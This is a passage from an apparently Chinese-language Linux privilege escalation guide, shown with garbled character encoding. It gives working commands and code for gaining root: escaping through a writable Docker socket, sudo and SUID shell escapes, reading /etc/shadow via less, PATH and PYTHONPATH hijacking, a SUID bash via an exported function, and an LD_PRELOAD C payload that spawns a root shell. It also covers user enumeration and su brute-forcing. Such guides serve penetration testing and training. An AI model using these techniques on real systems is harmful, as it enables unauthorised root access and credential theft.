<p>Docker å¥—æ¥å­—ï¼Œé€šå¸¸ä½äº <code>/var/run/docker.sock</code>ï¼Œæ˜¯ä¸€ä¸ªå…³é”®æ–‡ä»¶ï¼Œåº”è¯¥è¢«ä¿æŠ¤ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œå®ƒå¯¹ <code>root</code> ç”¨æˆ·å’Œ <code>docker</code> ç»„çš„æˆå‘˜æ˜¯å¯å†™çš„ã€‚æ‹¥æœ‰å¯¹è¯¥å¥—æ¥å­—çš„å†™è®¿é—®æƒé™å¯èƒ½å¯¼è‡´ç‰¹æƒå‡çº§ã€‚ä»¥ä¸‹æ˜¯å¦‚ä½•åšåˆ°è¿™ä¸€ç‚¹çš„è¯¦ç»†è¯´æ˜ï¼Œä»¥åŠåœ¨ Docker CLI ä¸å¯ç”¨æ—¶çš„æ›¿ä»£æ–¹æ³•ã€‚</p>
<h4 id="ä½¿ç”¨-docker-cli-è¿›è¡Œç‰¹æƒå‡çº§"><a class="header" href="#ä½¿ç”¨-docker-cli-è¿›è¡Œç‰¹æƒå‡çº§"><strong>ä½¿ç”¨ Docker CLI è¿›è¡Œç‰¹æƒå‡çº§</strong></a></h4>
<p>å¦‚æœæ‚¨å¯¹ Docker å¥—æ¥å­—å…·æœ‰å†™è®¿é—®æƒé™ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç‰¹æƒå‡çº§ï¼š</p>
<pre><code class="language-bash">docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
</code></pre>
<p>è¿™äº›å‘½ä»¤å…è®¸æ‚¨ä»¥æ ¹çº§åˆ«è®¿é—®ä¸»æœºçš„æ–‡ä»¶ç³»ç»Ÿè¿è¡Œå®¹å™¨ã€‚</p>
<h4 id="ç›´æ¥ä½¿ç”¨-docker-api"><a class="header" href="#ç›´æ¥ä½¿ç”¨-docker-api"><strong>ç›´æ¥ä½¿ç”¨ Docker API</strong></a></h4>
<p>åœ¨ Docker CLI ä¸å¯ç”¨çš„æƒ…å†µä¸‹ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨ Docker API å’Œ <code>curl</code> å‘½ä»¤æ“ä½œ Docker å¥—æ¥å­—ã€‚</p>
<ol>
<li><strong>åˆ—å‡º Docker é•œåƒï¼š</strong> æ£€ç´¢å¯ç”¨é•œåƒçš„åˆ—è¡¨ã€‚</li>
</ol>
<pre><code class="language-bash">curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
</code></pre>
<ol start="2">
<li><strong>åˆ›å»ºå®¹å™¨ï¼š</strong> å‘é€è¯·æ±‚ä»¥åˆ›å»ºä¸€ä¸ªæŒ‚è½½ä¸»æœºç³»ç»Ÿæ ¹ç›®å½•çš„å®¹å™¨ã€‚</li>
</ol>
<pre><code class="language-bash">curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"&lt;ImageID&gt;","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
</code></pre>
<p>å¯åŠ¨æ–°åˆ›å»ºçš„å®¹å™¨ï¼š</p>
<pre><code class="language-bash">curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/&lt;NewContainerID&gt;/start
</code></pre>
<ol start="3">
<li><strong>é™„åŠ åˆ°å®¹å™¨ï¼š</strong> ä½¿ç”¨ <code>socat</code> å»ºç«‹ä¸å®¹å™¨çš„è¿æ¥ï¼Œä»è€Œåœ¨å…¶ä¸­æ‰§è¡Œå‘½ä»¤ã€‚</li>
</ol>
<pre><code class="language-bash">socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/&lt;NewContainerID&gt;/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
</code></pre>
<p>åœ¨è®¾ç½®å¥½ <code>socat</code> è¿æ¥åï¼Œæ‚¨å¯ä»¥ç›´æ¥åœ¨å®¹å™¨ä¸­æ‰§è¡Œå‘½ä»¤ï¼Œå…·æœ‰å¯¹ä¸»æœºæ–‡ä»¶ç³»ç»Ÿçš„æ ¹çº§åˆ«è®¿é—®æƒé™ã€‚</p>
<h3 id="å…¶ä»–"><a class="header" href="#å…¶ä»–">å…¶ä»–</a></h3>
<p>è¯·æ³¨æ„ï¼Œå¦‚æœæ‚¨å¯¹ Docker å¥—æ¥å­—å…·æœ‰å†™æƒé™ï¼Œå› ä¸ºæ‚¨<strong>åœ¨ <code>docker</code> ç»„å†…</strong>ï¼Œæ‚¨æœ‰<a href="interesting-groups-linux-pe/#docker-group"><strong>æ›´å¤šçš„æƒé™æå‡æ–¹å¼</strong></a>ã€‚å¦‚æœ<a href="../../network-services-pentesting/2375-pentesting-docker.html#compromising"><strong>docker API åœ¨æŸä¸ªç«¯å£ä¸Šç›‘å¬</strong>ï¼Œæ‚¨ä¹Ÿå¯ä»¥å¦¥åå®ƒ</a>ã€‚</p>
<p>æŸ¥çœ‹<strong>æ›´å¤šä» docker ä¸­çªç ´æˆ–æ»¥ç”¨å®ƒä»¥æå‡æƒé™çš„æ–¹æ³•</strong>ï¼š</p>
<p>{% content-ref url="docker-security/" %}
<a href="docker-security/">docker-security</a>
{% endcontent-ref %}</p>
<h2 id="containerd-ctr-æƒé™æå‡"><a class="header" href="#containerd-ctr-æƒé™æå‡">Containerd (ctr) æƒé™æå‡</a></h2>
<p>å¦‚æœæ‚¨å‘ç°å¯ä»¥ä½¿ç”¨ <strong><code>ctr</code></strong> å‘½ä»¤ï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼Œå› ä¸º<strong>æ‚¨å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨å®ƒä»¥æå‡æƒé™</strong>ï¼š</p>
<p>{% content-ref url="containerd-ctr-privilege-escalation.md" %}
<a href="containerd-ctr-privilege-escalation.html">containerd-ctr-privilege-escalation.md</a>
{% endcontent-ref %}</p>
<h2 id="runc-æƒé™æå‡"><a class="header" href="#runc-æƒé™æå‡"><strong>RunC</strong> æƒé™æå‡</a></h2>
<p>å¦‚æœæ‚¨å‘ç°å¯ä»¥ä½¿ç”¨ <strong><code>runc</code></strong> å‘½ä»¤ï¼Œè¯·é˜…è¯»ä»¥ä¸‹é¡µé¢ï¼Œå› ä¸º<strong>æ‚¨å¯èƒ½èƒ½å¤Ÿæ»¥ç”¨å®ƒä»¥æå‡æƒé™</strong>ï¼š</p>
<p>{% content-ref url="runc-privilege-escalation.md" %}
<a href="runc-privilege-escalation.html">runc-privilege-escalation.md</a>
{% endcontent-ref %}</p>
<h2 id="d-bus"><a class="header" href="#d-bus"><strong>D-Bus</strong></a></h2>
<p>D-Bus æ˜¯ä¸€ä¸ªå¤æ‚çš„ <strong>è¿›ç¨‹é—´é€šä¿¡ (IPC) ç³»ç»Ÿ</strong>ï¼Œä½¿åº”ç”¨ç¨‹åºèƒ½å¤Ÿé«˜æ•ˆåœ°äº¤äº’å’Œå…±äº«æ•°æ®ã€‚å®ƒæ˜¯ä¸ºç°ä»£ Linux ç³»ç»Ÿè®¾è®¡çš„ï¼Œæä¾›äº†ä¸€ä¸ªå¼ºå¤§çš„æ¡†æ¶ï¼Œç”¨äºä¸åŒå½¢å¼çš„åº”ç”¨ç¨‹åºé€šä¿¡ã€‚</p>
<p>è¯¥ç³»ç»Ÿçµæ´»å¤šå˜ï¼Œæ”¯æŒåŸºæœ¬çš„ IPCï¼Œå¢å¼ºäº†è¿›ç¨‹ä¹‹é—´çš„æ•°æ®äº¤æ¢ï¼Œç±»ä¼¼äº <strong>å¢å¼ºçš„ UNIX åŸŸå¥—æ¥å­—</strong>ã€‚æ­¤å¤–ï¼Œå®ƒæœ‰åŠ©äºå¹¿æ’­äº‹ä»¶æˆ–ä¿¡å·ï¼Œä¿ƒè¿›ç³»ç»Ÿç»„ä»¶ä¹‹é—´çš„æ— ç¼é›†æˆã€‚ä¾‹å¦‚ï¼Œæ¥è‡ªè“ç‰™å®ˆæŠ¤è¿›ç¨‹çš„å…³äºæ¥ç”µçš„ä¿¡å·å¯ä»¥ä¿ƒä½¿éŸ³ä¹æ’­æ”¾å™¨é™éŸ³ï¼Œä»è€Œå¢å¼ºç”¨æˆ·ä½“éªŒã€‚æ­¤å¤–ï¼ŒD-Bus æ”¯æŒè¿œç¨‹å¯¹è±¡ç³»ç»Ÿï¼Œç®€åŒ–äº†åº”ç”¨ç¨‹åºä¹‹é—´çš„æœåŠ¡è¯·æ±‚å’Œæ–¹æ³•è°ƒç”¨ï¼Œç®€åŒ–äº†ä¼ ç»Ÿä¸Šå¤æ‚çš„è¿‡ç¨‹ã€‚</p>
<p>D-Bus åŸºäº <strong>å…è®¸/æ‹’ç»æ¨¡å‹</strong>ï¼Œæ ¹æ®åŒ¹é…çš„ç­–ç•¥è§„åˆ™çš„ç´¯ç§¯æ•ˆæœç®¡ç†æ¶ˆæ¯æƒé™ï¼ˆæ–¹æ³•è°ƒç”¨ã€ä¿¡å·å‘å°„ç­‰ï¼‰ã€‚è¿™äº›ç­–ç•¥æŒ‡å®šä¸æ€»çº¿çš„äº¤äº’ï¼Œå¯èƒ½é€šè¿‡åˆ©ç”¨è¿™äº›æƒé™æ¥å…è®¸æƒé™æå‡ã€‚</p>
<p>åœ¨ <code>/etc/dbus-1/system.d/wpa_supplicant.conf</code> ä¸­æä¾›äº†è¿™æ ·ä¸€ä¸ªç­–ç•¥çš„ç¤ºä¾‹ï¼Œè¯¦ç»†è¯´æ˜äº†æ ¹ç”¨æˆ·æ‹¥æœ‰ã€å‘é€å’Œæ¥æ”¶æ¥è‡ª <code>fi.w1.wpa_supplicant1</code> æ¶ˆæ¯çš„æƒé™ã€‚</p>
<p>æ²¡æœ‰æŒ‡å®šç”¨æˆ·æˆ–ç»„çš„ç­–ç•¥é€‚ç”¨äºæ‰€æœ‰æƒ…å†µï¼Œè€Œâ€œé»˜è®¤â€ä¸Šä¸‹æ–‡ç­–ç•¥é€‚ç”¨äºæ‰€æœ‰æœªè¢«å…¶ä»–ç‰¹å®šç­–ç•¥è¦†ç›–çš„æƒ…å†µã€‚</p>
<pre><code class="language-xml">&lt;policy user="root"&gt;
&lt;allow own="fi.w1.wpa_supplicant1"/&gt;
&lt;allow send_destination="fi.w1.wpa_supplicant1"/&gt;
&lt;allow send_interface="fi.w1.wpa_supplicant1"/&gt;
&lt;allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/&gt;
&lt;/policy&gt;
</code></pre>
<p><strong>äº†è§£å¦‚ä½•æšä¸¾å’Œåˆ©ç”¨ D-Bus é€šä¿¡ï¼š</strong></p>
<p>{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
<a href="d-bus-enumeration-and-command-injection-privilege-escalation.html">d-bus-enumeration-and-command-injection-privilege-escalation.md</a>
{% endcontent-ref %}</p>
<h2 id="ç½‘ç»œ"><a class="header" href="#ç½‘ç»œ"><strong>ç½‘ç»œ</strong></a></h2>
<p>æšä¸¾ç½‘ç»œå¹¶ç¡®å®šæœºå™¨çš„ä½ç½®æ€»æ˜¯å¾ˆæœ‰è¶£ã€‚</p>
<h3 id="é€šç”¨æšä¸¾"><a class="header" href="#é€šç”¨æšä¸¾">é€šç”¨æšä¸¾</a></h3>
<pre><code class="language-bash">#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf &amp; /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2&gt;/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2&gt;/dev/null)

#Files used by network services
lsof -i
</code></pre>
<h3 id="open-ports"><a class="header" href="#open-ports">Open ports</a></h3>
<p>å§‹ç»ˆæ£€æŸ¥åœ¨æ‚¨æ— æ³•ä¸ä¹‹äº¤äº’çš„æœºå™¨ä¸Šè¿è¡Œçš„ç½‘ç»œæœåŠ¡ï¼š</p>
<pre><code class="language-bash">(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
</code></pre>
<h3 id="sniffing"><a class="header" href="#sniffing">Sniffing</a></h3>
<p>æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥å—…æ¢æµé‡ã€‚å¦‚æœå¯ä»¥ï¼Œæ‚¨å¯èƒ½èƒ½å¤Ÿè·å–ä¸€äº›å‡­æ®ã€‚</p>
<pre><code>timeout 1 tcpdump
</code></pre>
<h2 id="ç”¨æˆ·"><a class="header" href="#ç”¨æˆ·">ç”¨æˆ·</a></h2>
<h3 id="é€šç”¨æšä¸¾-1"><a class="header" href="#é€šç”¨æšä¸¾-1">é€šç”¨æšä¸¾</a></h3>
<p>æ£€æŸ¥ <strong>who</strong> ä½ æ˜¯ï¼Œæ‹¥æœ‰çš„ <strong>privileges</strong>ï¼Œç³»ç»Ÿä¸­æœ‰å“ªäº› <strong>users</strong>ï¼Œå“ªäº›å¯ä»¥ <strong>login</strong>ï¼Œå“ªäº›å…·æœ‰ <strong>root privileges</strong>ï¼š</p>
<pre><code class="language-bash">#Info about me
id || (whoami &amp;&amp; groups) 2&gt;/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2&gt;/dev/null);do id $i;done 2&gt;/dev/null | sort
#Current user PGP keys
gpg --list-keys 2&gt;/dev/null
</code></pre>
<h3 id="big-uid"><a class="header" href="#big-uid">Big UID</a></h3>
<p>æŸäº›Linuxç‰ˆæœ¬å—åˆ°ä¸€ä¸ªæ¼æ´çš„å½±å“ï¼Œå…è®¸<strong>UID &gt; INT_MAX</strong>çš„ç”¨æˆ·æå‡æƒé™ã€‚æ›´å¤šä¿¡æ¯ï¼š<a href="https://gitlab.freedesktop.org/polkit/polkit/issues/74">è¿™é‡Œ</a>ï¼Œ<a href="https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh">è¿™é‡Œ</a>å’Œ<a href="https://twitter.com/paragonsec/status/1071152249529884674">è¿™é‡Œ</a>ã€‚<br />
<strong>åˆ©ç”¨å®ƒ</strong>ä½¿ç”¨ï¼š<strong><code>systemd-run -t /bin/bash</code></strong></p>
<h3 id="groups"><a class="header" href="#groups">Groups</a></h3>
<p>æ£€æŸ¥æ‚¨æ˜¯å¦æ˜¯æŸä¸ªå¯èƒ½æˆäºˆæ‚¨rootæƒé™çš„<strong>ç»„çš„æˆå‘˜</strong>ï¼š</p>
<p>{% content-ref url="interesting-groups-linux-pe/" %}
<a href="interesting-groups-linux-pe/">interesting-groups-linux-pe</a>
{% endcontent-ref %}</p>
<h3 id="clipboard"><a class="header" href="#clipboard">Clipboard</a></h3>
<p>æ£€æŸ¥å‰ªè´´æ¿ä¸­æ˜¯å¦æœ‰ä»»ä½•æœ‰è¶£çš„å†…å®¹ï¼ˆå¦‚æœå¯èƒ½çš„è¯ï¼‰</p>
<pre><code class="language-bash">if [ `which xclip 2&gt;/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2&gt;/dev/null`
echo "Highlighted text: "`xclip -o 2&gt;/dev/null`
elif [ `which xsel 2&gt;/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2&gt;/dev/null`
echo "Highlighted text: "`xsel -o 2&gt;/dev/null`
else echo "Not found xsel and xclip"
fi
</code></pre>
<h3 id="å¯†ç ç­–ç•¥"><a class="header" href="#å¯†ç ç­–ç•¥">å¯†ç ç­–ç•¥</a></h3>
<pre><code class="language-bash">grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
</code></pre>
<h3 id="å·²çŸ¥å¯†ç "><a class="header" href="#å·²çŸ¥å¯†ç ">å·²çŸ¥å¯†ç </a></h3>
<p>å¦‚æœä½ <strong>çŸ¥é“ç¯å¢ƒä¸­çš„ä»»ä½•å¯†ç </strong>ï¼Œè¯·å°è¯•ä½¿ç”¨è¯¥å¯†ç <strong>ç™»å½•æ¯ä¸ªç”¨æˆ·</strong>ã€‚</p>
<h3 id="su-brute"><a class="header" href="#su-brute">Su Brute</a></h3>
<p>å¦‚æœä½ ä¸ä»‹æ„åˆ¶é€ å¾ˆå¤šå™ªéŸ³ï¼Œå¹¶ä¸”è®¡ç®—æœºä¸Šå­˜åœ¨<code>su</code>å’Œ<code>timeout</code>äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯ä»¥å°è¯•ä½¿ç”¨<a href="https://github.com/carlospolop/su-bruteforce">su-bruteforce</a>è¿›è¡Œæš´åŠ›ç ´è§£ç”¨æˆ·ã€‚<br />
<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite"><strong>Linpeas</strong></a> ä½¿ç”¨<code>-a</code>å‚æ•°ä¹Ÿä¼šå°è¯•æš´åŠ›ç ´è§£ç”¨æˆ·ã€‚</p>
<h2 id="å¯å†™çš„-path-æ»¥ç”¨"><a class="header" href="#å¯å†™çš„-path-æ»¥ç”¨">å¯å†™çš„ PATH æ»¥ç”¨</a></h2>
<h3 id="path-1"><a class="header" href="#path-1">$PATH</a></h3>
<p>å¦‚æœä½ å‘ç°å¯ä»¥<strong>åœ¨ $PATH çš„æŸä¸ªæ–‡ä»¶å¤¹å†…å†™å…¥</strong>ï¼Œä½ å¯èƒ½èƒ½å¤Ÿé€šè¿‡<strong>åœ¨å¯å†™æ–‡ä»¶å¤¹å†…åˆ›å»ºä¸€ä¸ªåé—¨</strong>ï¼Œå…¶åç§°ä¸ºå°†ç”±å…¶ä»–ç”¨æˆ·ï¼ˆç†æƒ³æƒ…å†µä¸‹æ˜¯ rootï¼‰æ‰§è¡Œçš„æŸä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”è¯¥å‘½ä»¤<strong>ä¸æ˜¯ä»ä½äºä½ çš„å¯å†™æ–‡ä»¶å¤¹ä¹‹å‰çš„æ–‡ä»¶å¤¹åŠ è½½</strong>çš„ï¼Œä»è€Œæå‡æƒé™ã€‚</p>
<h3 id="sudo-å’Œ-suid"><a class="header" href="#sudo-å’Œ-suid">SUDO å’Œ SUID</a></h3>
<p>ä½ å¯èƒ½è¢«å…è®¸ä½¿ç”¨ sudo æ‰§è¡ŒæŸäº›å‘½ä»¤ï¼Œæˆ–è€…å®ƒä»¬å¯èƒ½å…·æœ‰ suid ä½ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ï¼š</p>
<pre><code class="language-bash">sudo -l #Check commands you can execute with sudo
find / -perm -4000 2&gt;/dev/null #Find all SUID binaries
</code></pre>
<p>ä¸€äº›<strong>æ„å¤–çš„å‘½ä»¤å…è®¸æ‚¨è¯»å–å’Œ/æˆ–å†™å…¥æ–‡ä»¶ï¼Œç”šè‡³æ‰§è¡Œå‘½ä»¤ã€‚</strong> ä¾‹å¦‚ï¼š</p>
<pre><code class="language-bash">sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp&gt;!/bin/sh
less&gt;! &lt;shell_comand&gt;
</code></pre>
<h3 id="nopasswd"><a class="header" href="#nopasswd">NOPASSWD</a></h3>
<p>Sudo é…ç½®å¯èƒ½å…è®¸ç”¨æˆ·åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ä»¥å…¶ä»–ç”¨æˆ·çš„æƒé™æ‰§è¡ŒæŸäº›å‘½ä»¤ã€‚</p>
<pre><code>$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
</code></pre>
<p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œç”¨æˆ· <code>demo</code> å¯ä»¥ä»¥ <code>root</code> èº«ä»½è¿è¡Œ <code>vim</code>ï¼Œç°åœ¨é€šè¿‡å°† ssh å¯†é’¥æ·»åŠ åˆ°æ ¹ç›®å½•æˆ–è°ƒç”¨ <code>sh</code> æ¥è·å– shell å˜å¾—å¾®ä¸è¶³é“ã€‚</p>
<pre><code>sudo vim -c '!sh'
</code></pre>
<h3 id="setenv"><a class="header" href="#setenv">SETENV</a></h3>
<p>æ­¤æŒ‡ä»¤å…è®¸ç”¨æˆ·åœ¨æ‰§è¡ŒæŸäº›æ“ä½œæ—¶<strong>è®¾ç½®ç¯å¢ƒå˜é‡</strong>ï¼š</p>
<pre><code class="language-bash">$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
</code></pre>
<p>è¿™ä¸ªä¾‹å­ï¼Œ<strong>åŸºäº HTB æœºå™¨ Admirer</strong>ï¼Œ<strong>æ˜“å—</strong> <strong>PYTHONPATH åŠ«æŒ</strong> çš„å½±å“ï¼Œåœ¨ä»¥ root èº«ä»½æ‰§è¡Œè„šæœ¬æ—¶åŠ è½½ä»»æ„ python åº“ï¼š</p>
<pre><code class="language-bash">sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
</code></pre>
<h3 id="sudo-æ‰§è¡Œç»•è¿‡è·¯å¾„"><a class="header" href="#sudo-æ‰§è¡Œç»•è¿‡è·¯å¾„">Sudo æ‰§è¡Œç»•è¿‡è·¯å¾„</a></h3>
<p><strong>è·³è½¬</strong> ä»¥è¯»å–å…¶ä»–æ–‡ä»¶æˆ–ä½¿ç”¨ <strong>ç¬¦å·é“¾æ¥</strong>ã€‚ä¾‹å¦‚åœ¨ sudoers æ–‡ä»¶ä¸­ï¼š <em>hacker10 ALL= (root) /bin/less /var/log/*</em></p>
<pre><code class="language-bash">sudo less /var/logs/anything
less&gt;:e /etc/shadow #Jump to read other files using privileged less
</code></pre>
<pre><code class="language-bash">ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
</code></pre>
<p>å¦‚æœä½¿ç”¨ <strong>wildcard</strong> (*)ï¼Œåˆ™æ›´å®¹æ˜“ï¼š</p>
<pre><code class="language-bash">sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
</code></pre>
<p><strong>å¯¹ç­–</strong>: <a href="https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/">https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/</a></p>
<h3 id="æ²¡æœ‰å‘½ä»¤è·¯å¾„çš„-sudo-å‘½ä»¤suid-äºŒè¿›åˆ¶æ–‡ä»¶"><a class="header" href="#æ²¡æœ‰å‘½ä»¤è·¯å¾„çš„-sudo-å‘½ä»¤suid-äºŒè¿›åˆ¶æ–‡ä»¶">æ²¡æœ‰å‘½ä»¤è·¯å¾„çš„ Sudo å‘½ä»¤/SUID äºŒè¿›åˆ¶æ–‡ä»¶</a></h3>
<p>å¦‚æœ <strong>sudo æƒé™</strong> è¢«æˆäºˆå•ä¸ªå‘½ä»¤ <strong>è€Œä¸æŒ‡å®šè·¯å¾„</strong>: <em>hacker10 ALL= (root) less</em>ï¼Œä½ å¯ä»¥é€šè¿‡æ›´æ”¹ PATH å˜é‡æ¥åˆ©ç”¨å®ƒã€‚</p>
<pre><code class="language-bash">export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
</code></pre>
<p>è¿™ç§æŠ€æœ¯ä¹Ÿå¯ä»¥åœ¨<strong>suid</strong>äºŒè¿›åˆ¶æ–‡ä»¶<strong>æ‰§è¡Œå¦ä¸€ä¸ªå‘½ä»¤è€Œä¸æŒ‡å®šè·¯å¾„æ—¶ä½¿ç”¨ï¼ˆå§‹ç»ˆä½¿ç”¨</strong><em><strong>strings</strong></em><strong>æ£€æŸ¥å¥‡æ€ªçš„SUIDäºŒè¿›åˆ¶æ–‡ä»¶çš„å†…å®¹ï¼‰</strong>ã€‚</p>
<p><a href="payloads-to-execute.html">æ‰§è¡Œçš„æœ‰æ•ˆè½½è·ç¤ºä¾‹ã€‚</a></p>
<h3 id="å¸¦å‘½ä»¤è·¯å¾„çš„suidäºŒè¿›åˆ¶æ–‡ä»¶"><a class="header" href="#å¸¦å‘½ä»¤è·¯å¾„çš„suidäºŒè¿›åˆ¶æ–‡ä»¶">å¸¦å‘½ä»¤è·¯å¾„çš„SUIDäºŒè¿›åˆ¶æ–‡ä»¶</a></h3>
<p>å¦‚æœ<strong>suid</strong>äºŒè¿›åˆ¶æ–‡ä»¶<strong>æ‰§è¡Œå¦ä¸€ä¸ªå‘½ä»¤å¹¶æŒ‡å®šè·¯å¾„</strong>ï¼Œé‚£ä¹ˆä½ å¯ä»¥å°è¯•<strong>å¯¼å‡ºä¸€ä¸ªåä¸ºè¯¥suidæ–‡ä»¶è°ƒç”¨çš„å‘½ä»¤çš„å‡½æ•°</strong>ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªsuidäºŒè¿›åˆ¶æ–‡ä»¶è°ƒç”¨_<strong>/usr/sbin/service apache2 start</strong>_ï¼Œä½ å¿…é¡»å°è¯•åˆ›å»ºè¯¥å‡½æ•°å¹¶å¯¼å‡ºå®ƒï¼š</p>
<pre><code class="language-bash">function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; }
export -f /usr/sbin/service
</code></pre>
<p>ç„¶åï¼Œå½“ä½ è°ƒç”¨suidäºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œè¿™ä¸ªå‡½æ•°å°†è¢«æ‰§è¡Œ</p>
<h3 id="ld_preload--ld_library_path"><a class="header" href="#ld_preload--ld_library_path">LD_PRELOAD &amp; <strong>LD_LIBRARY_PATH</strong></a></h3>
<p><strong>LD_PRELOAD</strong>ç¯å¢ƒå˜é‡ç”¨äºæŒ‡å®šä¸€ä¸ªæˆ–å¤šä¸ªå…±äº«åº“ï¼ˆ.soæ–‡ä»¶ï¼‰ï¼Œè¿™äº›åº“å°†åœ¨åŠ è½½å™¨åŠ è½½æ‰€æœ‰å…¶ä»–åº“ä¹‹å‰è¢«åŠ è½½ï¼ŒåŒ…æ‹¬æ ‡å‡†Cåº“ï¼ˆ<code>libc.so</code>ï¼‰ã€‚è¿™ä¸ªè¿‡ç¨‹è¢«ç§°ä¸ºé¢„åŠ è½½åº“ã€‚</p>
<p>ç„¶è€Œï¼Œä¸ºäº†ç»´æŠ¤ç³»ç»Ÿå®‰å…¨å¹¶é˜²æ­¢æ­¤åŠŸèƒ½è¢«åˆ©ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨<strong>suid/sgid</strong>å¯æ‰§è¡Œæ–‡ä»¶ä¸­ï¼Œç³»ç»Ÿå¼ºåˆ¶æ‰§è¡ŒæŸäº›æ¡ä»¶ï¼š</p>
<ul>
<li>åŠ è½½å™¨å¿½ç•¥<strong>LD_PRELOAD</strong>å¯¹äºçœŸå®ç”¨æˆ·IDï¼ˆ<em>ruid</em>ï¼‰ä¸æœ‰æ•ˆç”¨æˆ·IDï¼ˆ<em>euid</em>ï¼‰ä¸åŒ¹é…çš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li>
<li>å¯¹äºå…·æœ‰suid/sgidçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä»…åœ¨æ ‡å‡†è·¯å¾„ä¸­ä¸”ä¹Ÿå…·æœ‰suid/sgidçš„åº“ä¼šè¢«é¢„åŠ è½½ã€‚</li>
</ul>
<p>å¦‚æœä½ æœ‰èƒ½åŠ›ä½¿ç”¨<code>sudo</code>æ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”<code>sudo -l</code>çš„è¾“å‡ºåŒ…å«è¯­å¥<strong>env_keep+=LD_PRELOAD</strong>ï¼Œåˆ™å¯èƒ½å‘ç”Ÿæƒé™æå‡ã€‚è¿™ç§é…ç½®å…è®¸<strong>LD_PRELOAD</strong>ç¯å¢ƒå˜é‡æŒç»­å­˜åœ¨å¹¶è¢«è¯†åˆ«ï¼Œå³ä½¿åœ¨ä½¿ç”¨<code>sudo</code>è¿è¡Œå‘½ä»¤æ—¶ï¼Œä¹Ÿå¯èƒ½å¯¼è‡´ä»¥æå‡çš„æƒé™æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<pre><code>Defaults        env_keep += LD_PRELOAD
</code></pre>
<p>ä¿å­˜ä¸º <strong>/tmp/pe.c</strong></p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
</code></pre>
<p>ç„¶å <strong>ç¼–è¯‘å®ƒ</strong> ä½¿ç”¨ï¼š</p>
<pre><code class="language-bash">cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
</code></pre>
<p>æœ€åï¼Œ<strong>æå‡æƒé™</strong> è¿è¡Œ</p>
<pre><code class="language-bash">sudo LD_PRELOAD=./pe.so &lt;COMMAND&gt; #Use any command you can run with sudo
</code></pre>
<p>{% hint style="danger" %}
